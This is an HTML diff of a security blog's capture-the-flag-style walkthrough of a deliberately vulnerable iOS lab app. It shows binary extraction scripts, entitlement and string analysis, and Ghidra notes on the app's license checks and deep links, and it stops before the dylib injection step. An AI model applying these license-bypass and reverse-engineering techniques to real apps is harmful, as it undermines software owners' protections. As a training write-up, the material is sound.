@@ -1,271 +1,144 @@
-<!DOCTYPE html>
-<html lang="en-us">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Runner Mobile Hacking Labs | incogbyte</title>
-  <meta name="description" content="Offensive Security">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/css/style.css">
-</head>
-<body>
-  <canvas id="matrix-bg"></canvas>
-  <div class="scanline"></div>
-
-  <header class="site-header">
-  <nav class="navbar">
-    <a href="/" class="logo">
-      <span class="logo-bracket">[</span>
-      <span class="logo-text">incogbyte</span>
-      <span class="logo-bracket">]</span>
-      <span class="cursor">_</span>
-    </a>
-    <button class="menu-toggle" aria-label="Toggle menu">
-      <span></span>
-      <span></span>
-      <span></span>
-    </button>
-    <ul class="nav-links">
-      
-      <li><a href="/" class="nav-link">Home</a></li>
-      
-      <li><a href="/posts/" class="nav-link">Posts</a></li>
-      
-      <li><a href="/cve/" class="nav-link">CVEs</a></li>
-      
-      <li><a href="/about/" class="nav-link">About</a></li>
-      
-    </ul>
-  </nav>
-</header>
-
-
-  <main class="container">
-    
-<article class="post-single">
-  <header class="post-header fade-in">
-    <h1 class="post-single-title">Runner Mobile Hacking Labs</h1>
-    
-    <div class="post-single-meta">
-      <time>June 02, 2025</time>
-      <span class="reading-time">4 min read</span>
-    </div>
-    
-    
-  </header>
-
-  <div class="post-content fade-in">
-    <p>In this challenge, you’ll be working with a fictitious app called <strong>Run Time</strong>, which tracks your steps while running. Your objective is to <strong>bypass the app’s protections, inject a dynamic library, and achieve code execution</strong>. <a href="https://www.mobilehackinglab.com/path-player?courseid=lab-runtime">https://www.mobilehackinglab.com/path-player?courseid=lab-runtime</a></p>
-<p>On a <strong>jailbroken device</strong>, you can install the .ipa file using:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ideviceinstaller -i com.mobilehackinglab.runtime.ipa
-</span></span></code></pre></div><p>We’ll start by analyzing the app’s binary using class-dump, examining its Info.plist, and extracting class metadata.</p>
-<p>You can use the following script to automate the extraction:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">#!/bin/bash
-</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#ff79c6">[</span> -z <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$1</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">]</span>; <span style="color:#ff79c6">then</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Usage: </span><span style="color:#8be9fd;font-style:italic">$0</span><span style="color:#f1fa8c"> &lt;path_to_ipa_file&gt;&#34;</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">exit</span> <span style="color:#bd93f9">1</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">fi</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">IPA_FILE</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$1</span><span style="color:#f1fa8c">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">APP_NAME</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">$(</span>basename <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$IPA_FILE</span><span style="color:#f1fa8c">&#34;</span> .ipa<span style="color:#ff79c6">)</span><span style="color:#f1fa8c">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">OUTPUT_DIR</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">$(</span>dirname <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$IPA_FILE</span><span style="color:#f1fa8c">&#34;</span> | xargs readlink -f<span style="color:#ff79c6">)</span><span style="color:#f1fa8c">/</span><span style="color:#8be9fd;font-style:italic">$APP_NAME</span><span style="color:#f1fa8c">&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>mkdir -p <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$OUTPUT_DIR</span><span style="color:#f1fa8c">/_extracted&#34;</span>
-</span></span><span style="display:flex;"><span>unzip -q <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$IPA_FILE</span><span style="color:#f1fa8c">&#34;</span> -d <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$OUTPUT_DIR</span><span style="color:#f1fa8c">/_extracted&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">APP_PATH</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">$(</span>find <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$OUTPUT_DIR</span><span style="color:#f1fa8c">/_extracted&#34;</span> -name <span style="color:#f1fa8c">&#34;*.app&#34;</span> -type d<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">BINARY</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$APP_PATH</span><span style="color:#f1fa8c">/</span><span style="color:#ff79c6">$(</span>basename <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$APP_PATH</span><span style="color:#f1fa8c">&#34;</span> .app<span style="color:#ff79c6">)</span><span style="color:#f1fa8c">&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>mkdir -p <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$OUTPUT_DIR</span><span style="color:#f1fa8c">/class_dump&#34;</span>
-</span></span><span style="display:flex;"><span>mkdir -p <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$OUTPUT_DIR</span><span style="color:#f1fa8c">/swift_dump&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;[*] Dumping Objective-C classes...&#34;</span>
-</span></span><span style="display:flex;"><span>ipsw class-dump <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$BINARY</span><span style="color:#f1fa8c">&#34;</span> --headers -o <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$OUTPUT_DIR</span><span style="color:#f1fa8c">/class_dump&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;[*] Dumping Swift classes...&#34;</span>
-</span></span><span style="display:flex;"><span>ipsw swift-dump <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$BINARY</span><span style="color:#f1fa8c">&#34;</span> &gt; <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$OUTPUT_DIR</span><span style="color:#f1fa8c">/swift_dump/</span><span style="color:#8be9fd;font-style:italic">$APP_NAME</span><span style="color:#f1fa8c">-mangled.txt&#34;</span>
-</span></span><span style="display:flex;"><span>ipsw swift-dump <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$BINARY</span><span style="color:#f1fa8c">&#34;</span> --demangle &gt; <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$OUTPUT_DIR</span><span style="color:#f1fa8c">/swift_dump/</span><span style="color:#8be9fd;font-style:italic">$APP_NAME</span><span style="color:#f1fa8c">-demangled.txt&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;[+] Dump completed for </span><span style="color:#8be9fd;font-style:italic">$APP_NAME</span><span style="color:#f1fa8c">&#34;</span>
-</span></span></code></pre></div><p>Use ipsw to analyze the Info.plist:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ipsw plist Info.plist
-</span></span></code></pre></div><p>Look for interesting values such as CFBundleIdentifier, MinimumOSVersion, or custom URL schemes:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;CFBundleURLTypes&#34;</span>: <span style="color:#ff79c6">[</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">{</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;CFBundleTypeRole&#34;</span>: <span style="color:#f1fa8c">&#34;Viewer&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;CFBundleURLName&#34;</span>: <span style="color:#f1fa8c">&#34;com.mobilehackinglab.runtime&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;CFBundleURLSchemes&#34;</span>: <span style="color:#ff79c6">[</span>
-</span></span><span style="display:flex;"><span>      <span style="color:#f1fa8c">&#34;runtime&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">]</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">}</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">]</span>
-</span></span></code></pre></div><p>This reveals a custom <strong>URL scheme</strong>: runtime://. The app handles custom URLs via the SceneDelegate:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;key&gt;UISceneDelegateClassName&lt;/key&gt;
-</span></span><span style="display:flex;"><span>&lt;string&gt;Runtime.SceneDelegate&lt;/string&gt;
-</span></span></code></pre></div><p>To inspect symbols in the binary:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>objdump --syms Runtime | grep <span style="color:#f1fa8c">&#34;d  &#34;</span>
-</span></span></code></pre></div><p>This can reveal functions and internal modules, such as: (This output is very long.. )</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_<span style="color:#8be9fd;font-style:italic">$s7Runtime12registerUser8username8passwordSbSS_SStF</span>
-</span></span><span style="display:flex;"><span>_<span style="color:#8be9fd;font-style:italic">$s7Runtime7contextSo22NSManagedObjectContextCvau</span>
-</span></span><span style="display:flex;"><span>license.dylib
-</span></span><span style="display:flex;"><span>.....
-</span></span><span style="display:flex;"><span>..
-</span></span><span style="display:flex;"><span>.....
-</span></span><span style="display:flex;"><span>...
-</span></span></code></pre></div><p>Use ipsw to extract entitlements:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ipsw ent --input Runtime
-</span></span></code></pre></div><p>The result is:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;key&gt;get-task-allow&lt;/key&gt;
-</span></span><span style="display:flex;"><span>&lt;true/&gt;
-</span></span></code></pre></div><p>This shows that <strong>debugging is enabled</strong>, allowing the use of LLDB or Xcode for runtime analysis.</p>
-<p>Check if the binary is encrypted:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>otool -l Runtime | grep -A <span style="color:#bd93f9">5</span> LC_ENCRYPTION_INFO
-</span></span></code></pre></div><p>If cryptid is 0, the binary is <strong>not encrypted</strong> and is ready for static/dynamic analysis.</p>
-<p>You can extract strings and look for clues:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings -a <span style="color:#f1fa8c">&#34;Runtime&#34;</span> | grep -iE <span style="color:#f1fa8c">&#34;openURLContexts|token|keys|license|request|://|key&#34;</span>
-</span></span></code></pre></div><p>Notable findings:</p>
-<pre tabindex="0"><code>runtime://buypro?server=mhl.pages.dev/runtime
+<!doctype html><html lang=en-us><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Runner Mobile Hacking Labs | incogbyte</title>
+<meta name=description content="Offensive security researcher focused on vulnerability research, mobile security, application security, and reverse engineering."><meta name=author content="Rodolfo Tavares"><meta name=theme-color content="#0b0e13"><link rel=canonical href=https://incogbyte.github.io/posts/runner-mobilehackinglabs/><meta property="og:title" content="Runner Mobile Hacking Labs | incogbyte"><meta property="og:description" content="Offensive security researcher focused on vulnerability research, mobile security, application security, and reverse engineering."><meta property="og:type" content="article"><meta property="og:url" content="https://incogbyte.github.io/posts/runner-mobilehackinglabs/"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel=stylesheet><script src=/js/theme-init.js></script><link rel=stylesheet href=/css/style.css></head><body><a class=skip-link href=#main-content>Skip to content</a><div class=site-grid aria-hidden=true></div><header class=site-header><nav class=navbar aria-label="Main navigation"><a href=/ class=logo aria-label="Rodolfo Tavares, Home"><span class=logo-mark aria-hidden=true>~/</span>
+<span class=logo-lockup><span class=logo-text>incogbyte</span>
+<span class=logo-subtitle>offensive security research</span></span></a><ul class=nav-links id=site-navigation><li><a href=/posts/ class=nav-link>Writing</a></li><li><a href=/cve/ class=nav-link>CVEs</a></li><li><a href=/about/ class=nav-link>About</a></li></ul><div class=nav-actions><button class=theme-toggle type=button aria-label="Switch to light theme" title="Switch to light theme">
+<span class=theme-icon aria-hidden=true>☀</span>
+</button>
+<button class=menu-toggle type=button aria-label="Open navigation" aria-expanded=false aria-controls=site-navigation>
+<span></span>
+<span></span>
+<span></span></button></div></nav></header><main class=container id=main-content><article class=post-single><header class="post-header fade-in"><h1 class=post-single-title>Runner Mobile Hacking Labs</h1><div class=post-single-meta><time>June 02, 2025</time>
+<span class=reading-time>4 min read</span></div><div class=post-tags><span class=tag>mobile</span>
+<span class=tag>ios</span>
+<span class=tag>reverse-engineering</span>
+<span class=tag>lab</span></div></header><div class="post-content fade-in"><p>In this challenge, you’ll be working with a fictitious app called <strong>Run Time</strong>, which tracks your steps while running. Your objective is to <strong>bypass the app’s protections, inject a dynamic library, and achieve code execution</strong>. <a href="https://www.mobilehackinglab.com/path-player?courseid=lab-runtime">https://www.mobilehackinglab.com/path-player?courseid=lab-runtime</a></p><p>On a <strong>jailbroken device</strong>, you can install the .ipa file using:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ideviceinstaller -i com.mobilehackinglab.runtime.ipa
+</span></span></code></pre></div><p>We’ll start by analyzing the app’s binary using class-dump, examining its Info.plist, and extracting class metadata.</p><p>You can use the following script to automate the extraction:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#ff79c6>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#ff79c6></span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>[</span> -z <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$1</span><span style=color:#f1fa8c>&#34;</span> <span style=color:#ff79c6>]</span>; <span style=color:#ff79c6>then</span>
+</span></span><span style=display:flex><span>  <span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;Usage: </span><span style=color:#8be9fd;font-style:italic>$0</span><span style=color:#f1fa8c> &lt;path_to_ipa_file&gt;&#34;</span>
+</span></span><span style=display:flex><span>  <span style=color:#8be9fd;font-style:italic>exit</span> <span style=color:#bd93f9>1</span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>fi</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>IPA_FILE</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$1</span><span style=color:#f1fa8c>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>APP_NAME</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>$(</span>basename <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$IPA_FILE</span><span style=color:#f1fa8c>&#34;</span> .ipa<span style=color:#ff79c6>)</span><span style=color:#f1fa8c>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>OUTPUT_DIR</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>$(</span>dirname <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$IPA_FILE</span><span style=color:#f1fa8c>&#34;</span> | xargs readlink -f<span style=color:#ff79c6>)</span><span style=color:#f1fa8c>/</span><span style=color:#8be9fd;font-style:italic>$APP_NAME</span><span style=color:#f1fa8c>&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mkdir -p <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$OUTPUT_DIR</span><span style=color:#f1fa8c>/_extracted&#34;</span>
+</span></span><span style=display:flex><span>unzip -q <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$IPA_FILE</span><span style=color:#f1fa8c>&#34;</span> -d <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$OUTPUT_DIR</span><span style=color:#f1fa8c>/_extracted&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>APP_PATH</span><span style=color:#ff79c6>=</span><span style=color:#ff79c6>$(</span>find <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$OUTPUT_DIR</span><span style=color:#f1fa8c>/_extracted&#34;</span> -name <span style=color:#f1fa8c>&#34;*.app&#34;</span> -type d<span style=color:#ff79c6>)</span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>BINARY</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$APP_PATH</span><span style=color:#f1fa8c>/</span><span style=color:#ff79c6>$(</span>basename <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$APP_PATH</span><span style=color:#f1fa8c>&#34;</span> .app<span style=color:#ff79c6>)</span><span style=color:#f1fa8c>&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mkdir -p <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$OUTPUT_DIR</span><span style=color:#f1fa8c>/class_dump&#34;</span>
+</span></span><span style=display:flex><span>mkdir -p <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$OUTPUT_DIR</span><span style=color:#f1fa8c>/swift_dump&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;[*] Dumping Objective-C classes...&#34;</span>
+</span></span><span style=display:flex><span>ipsw class-dump <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$BINARY</span><span style=color:#f1fa8c>&#34;</span> --headers -o <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$OUTPUT_DIR</span><span style=color:#f1fa8c>/class_dump&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;[*] Dumping Swift classes...&#34;</span>
+</span></span><span style=display:flex><span>ipsw swift-dump <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$BINARY</span><span style=color:#f1fa8c>&#34;</span> &gt; <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$OUTPUT_DIR</span><span style=color:#f1fa8c>/swift_dump/</span><span style=color:#8be9fd;font-style:italic>$APP_NAME</span><span style=color:#f1fa8c>-mangled.txt&#34;</span>
+</span></span><span style=display:flex><span>ipsw swift-dump <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$BINARY</span><span style=color:#f1fa8c>&#34;</span> --demangle &gt; <span style=color:#f1fa8c>&#34;</span><span style=color:#8be9fd;font-style:italic>$OUTPUT_DIR</span><span style=color:#f1fa8c>/swift_dump/</span><span style=color:#8be9fd;font-style:italic>$APP_NAME</span><span style=color:#f1fa8c>-demangled.txt&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#34;[+] Dump completed for </span><span style=color:#8be9fd;font-style:italic>$APP_NAME</span><span style=color:#f1fa8c>&#34;</span>
+</span></span></code></pre></div><p>Use ipsw to analyze the Info.plist:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ipsw plist Info.plist
+</span></span></code></pre></div><p>Look for interesting values such as CFBundleIdentifier, MinimumOSVersion, or custom URL schemes:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f1fa8c>&#34;CFBundleURLTypes&#34;</span>: <span style=color:#ff79c6>[</span>
+</span></span><span style=display:flex><span>  <span style=color:#ff79c6>{</span>
+</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;CFBundleTypeRole&#34;</span>: <span style=color:#f1fa8c>&#34;Viewer&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;CFBundleURLName&#34;</span>: <span style=color:#f1fa8c>&#34;com.mobilehackinglab.runtime&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#34;CFBundleURLSchemes&#34;</span>: <span style=color:#ff79c6>[</span>
+</span></span><span style=display:flex><span>      <span style=color:#f1fa8c>&#34;runtime&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>]</span>
+</span></span><span style=display:flex><span>  <span style=color:#ff79c6>}</span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>]</span>
+</span></span></code></pre></div><p>This reveals a custom <strong>URL scheme</strong>: runtime://. The app handles custom URLs via the SceneDelegate:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&lt;key&gt;UISceneDelegateClassName&lt;/key&gt;
+</span></span><span style=display:flex><span>&lt;string&gt;Runtime.SceneDelegate&lt;/string&gt;
+</span></span></code></pre></div><p>To inspect symbols in the binary:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>objdump --syms Runtime | grep <span style=color:#f1fa8c>&#34;d  &#34;</span>
+</span></span></code></pre></div><p>This can reveal functions and internal modules, such as: (This output is very long.. )</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>_<span style=color:#8be9fd;font-style:italic>$s7Runtime12registerUser8username8passwordSbSS_SStF</span>
+</span></span><span style=display:flex><span>_<span style=color:#8be9fd;font-style:italic>$s7Runtime7contextSo22NSManagedObjectContextCvau</span>
+</span></span><span style=display:flex><span>license.dylib
+</span></span><span style=display:flex><span>.....
+</span></span><span style=display:flex><span>..
+</span></span><span style=display:flex><span>.....
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p>Use ipsw to extract entitlements:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ipsw ent --input Runtime
+</span></span></code></pre></div><p>The result is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&lt;key&gt;get-task-allow&lt;/key&gt;
+</span></span><span style=display:flex><span>&lt;true/&gt;
+</span></span></code></pre></div><p>This shows that <strong>debugging is enabled</strong>, allowing the use of LLDB or Xcode for runtime analysis.</p><p>Check if the binary is encrypted:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>otool -l Runtime | grep -A <span style=color:#bd93f9>5</span> LC_ENCRYPTION_INFO
+</span></span></code></pre></div><p>If cryptid is 0, the binary is <strong>not encrypted</strong> and is ready for static/dynamic analysis.</p><p>You can extract strings and look for clues:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>strings -a <span style=color:#f1fa8c>&#34;Runtime&#34;</span> | grep -iE <span style=color:#f1fa8c>&#34;openURLContexts|token|keys|license|request|://|key&#34;</span>
+</span></span></code></pre></div><p>Notable findings:</p><pre tabindex=0><code>runtime://buypro?server=mhl.pages.dev/runtime
 runtime://starttrial?server=mhl.pages.dev/runtime&amp;trialKey=1234-5678-ABCD
 Invalid license format
 X-API-Key
 license.dylib
 Invalid token format
 scene:openURLContexts:
-</code></pre><p>These strings suggest:</p>
-<ul>
-<li>The presence of a <strong>trial license system</strong></li>
-<li>An external <strong>license.dylib</strong></li>
-<li>Custom <strong>deep links</strong> for upgrading the app or starting trials</li>
-</ul>
-<h3 id="ghidra">Ghidra</h3>
-<p><img src="/images/runner-01.png" alt=""></p>
-<p><img src="/images/runner-02.png" alt=""></p>
-<p><img src="/images/runner-03.png" alt=""></p>
-<p>This  getLicenseFile method in SubscribeController is interesting, constructs an HTTP GET request to http://server/download, including an &quot;X-API-Key&quot; header with the provided token. If the URL is invalid, it shows an error message.  Analise more functions we have:</p>
-<pre tabindex="0"><code>verifyLicense
+</code></pre><p>These strings suggest:</p><ul><li>The presence of a <strong>trial license system</strong></li><li>An external <strong>license.dylib</strong></li><li>Custom <strong>deep links</strong> for upgrading the app or starting trials</li></ul><h3 id=ghidra>Ghidra</h3><p><img src=/images/runner-01.png alt></p><p><img src=/images/runner-02.png alt></p><p><img src=/images/runner-03.png alt></p><p>This getLicenseFile method in SubscribeController is interesting, constructs an HTTP GET request to http://server/download, including an "X-API-Key" header with the provided token. If the URL is invalid, it shows an error message. Analise more functions we have:</p><pre tabindex=0><code>verifyLicense
 
 trialSubscription
 </code></pre><p>The verifyLicense method of Runtime::SubscribeController verifies a software license by making an HTTP request to a specific server endpoint. It takes parameters including the server URL, a license key, and other supporting data. (http://server/payment?license_type=pro) and use a regular expression: (^[0-9]{4}-[0-9]{4}-[A-Z]{4}$) to validate the license format.
-The trialSubscription method in Runtime::SubscribeController attempts to <strong>open a specific URL</strong> that starts a trial subscription in the app. ( runtime://starttrial?server=mhl.pages.dev/runtime trialKey=1234-5678-ABCD )</p>
-<p>This function belongs to the SubscribeController class and performs license verification.
-It first checks if the server string contains mhl.pages.dev; if not, it shows an “Invalid Server” error. If the license key contains buypro, it redirects the user to a purchase URL after confirming the device can open it. Otherwise, it validates the license key format against a regex pattern (e.g., “1234-5678-ABCD”); if invalid, it shows an error. If valid, it builds a URL to http://server/health and sends an HTTP request to verify the license. The response is handled asynchronously to confirm license validity. In summary, the function validates inputs and verifies the license by querying the server’s health endpoint.</p>
-<p>Now we need to find the dlyb injection. The function that handle this is:</p>
